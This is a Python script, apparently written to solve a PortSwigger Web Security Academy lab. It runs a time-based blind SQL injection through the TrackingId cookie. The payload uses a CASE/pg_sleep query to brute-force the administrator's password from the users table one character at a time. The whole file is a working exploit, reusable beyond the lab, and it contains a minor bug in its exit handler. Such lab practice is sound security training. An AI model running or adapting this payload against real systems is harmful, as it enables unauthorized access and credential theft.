#!/usr/bin/python3
from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n Aborted! (CTRL + C)\n")
    sys.exit[1]
#crt+c 
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0ac500fa04110f51c1a5dfc300870079.web-security-academy.net"
characters_dictionary = string.ascii_lowercase + string.digits #Lower case characters from a to z and numbers
password_length = 20

def MakeRequest():
    password = ""

    progress_log1 = log.progress("Brute Force")
    progress_log1.status("Begining brute force attack!")
    time.sleep(2)
    pw_log = log.progress("Password")
    password_length = 20

    for i in range(1,password_length + 1):
        for c in characters_dictionary:
            cookies = {
                    'TrackingId':"THRV4fHYAmfmrN0D'||(SELECT (CASE WHEN (SUBSTRING(password, %d,1) ='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END) from users where username='administrator')-- -" %(i, c),
                'session':'JgFyjYeQlG7a7Sea7QIFDwtdaKB7hOiZ'
            }

            progress_log1.status(cookies['TrackingId'])
            
            start_time = time.time()

            r = requests.get(main_url, cookies = cookies)

            end_time = time.time()

            time_dif = end_time - start_time
            #print(r.text)
            #time.sleep(100)
            if time_dif > 7:
                password += c
                pw_log.status(password)
                break
if __name__ == '__main__':
    MakeRequest()

